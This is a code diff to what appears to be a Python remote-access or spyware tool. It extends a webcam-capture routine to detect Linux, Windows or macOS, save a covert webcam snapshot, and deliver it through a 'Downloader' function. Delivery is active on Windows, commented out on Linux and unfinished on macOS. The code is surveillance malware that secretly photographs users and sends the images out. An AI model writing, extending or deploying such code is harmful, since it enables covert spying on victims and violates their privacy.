@@ -69,6 +69,7 @@ import random
 import time
 import string
 import cv2
+import platform
 
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -963,15 +964,40 @@ def webcam_Capture():
 
 	cv2.imshow('frame', rgb)
 	
-	# Save web cam screenshot...
-	usrHandle = os.environ['USERNAME']
-	envoDr = 'C:\Users\%s\Downloads\wc_ss.png' % (usrHandle)
-	out = cv2.imwrite(envoDr, frame)
+	if(platform.system()=="Linux"):
+		print "Linux OS Detected!"
 
-	cap.release()
-	cv2.destroyAllWindows()
-	# Deliver web cam screenshot...
-	Downloader(envoDr)
+		# Save web cam screenshot...
+		homedir = os.environ['HOME']
+		envoDr = '%s/wc_ss.png' % (homedir)
+		out = cv2.imwrite(envoDr, frame)
+
+		print "Web cam screenshot saved!"
+
+		cap.release()
+		cv2.destroyAllWindows()
+		# Deliver web cam screenshot...
+		#Downloader(envoDr)
+		print "Web cam screenshot delivered!"
+	elif(platform.system()=="Windows"):
+		print "Windows OS Detected!"
+
+		# Save web cam screenshot...
+		usrHandle = os.environ['USERNAME']
+		envoDr = 'C:\Users\%s\Downloads\wc_ss.png' % (usrHandle)
+		out = cv2.imwrite(envoDr, frame)
+
+		print "Web cam screenshot saved!"
+
+		cap.release()
+		cv2.destroyAllWindows()
+		# Deliver web cam screenshot...
+		Downloader(envoDr)
+		print "Web cam screenshot delivered!"
+	# Mac condition unfinished...
+	elif(platform.system()=="Darwin"):
+		print "Mac OS detected!"
+		print "Unfinished section..."
 
 cmdList = """
 [Fun]:
